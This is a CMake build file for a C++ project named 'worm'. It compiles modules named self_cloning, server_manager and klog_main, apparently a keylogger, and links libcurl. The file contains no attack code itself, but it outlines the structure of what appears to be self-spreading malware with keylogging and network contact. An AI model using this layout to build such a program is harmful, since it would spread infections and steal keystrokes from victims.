cmake_minimum_required(VERSION 3.28)
project(worm)
set(CMAKE_CXX_STANDARD 17)
#set(CURL_LIBRARY "C:/Users/aliih/OneDrive/Belgeler/curl/lib")
set(CURL_INCLUDE_DIR "C:/Users/aliih/OneDrive/Belgeler/curl/include")
set(CURL_LIBRARY "C:/Users/aliih/OneDrive/Belgeler/curl/lib/libcurl.dll.a")

add_executable(worm source/main.cpp
        source/self_cloning.cpp
        header/self_cloning.h
        header/server_manager.h
        source/server_manager.cpp
        header/main.h
        test/worm_test.cpp
        test/test_exec.cpp
        source/klog_main.cpp)

find_package(CURL REQUIRED)
target_include_directories(worm PRIVATE ${CURL_INCLUDE_DIR})
target_link_libraries(worm ${CURL_LIBRARY})
#include_directories(${CURL_INCLUDE_DIR})
#target_link_libraries(worm ${CURL_LIBRARIES})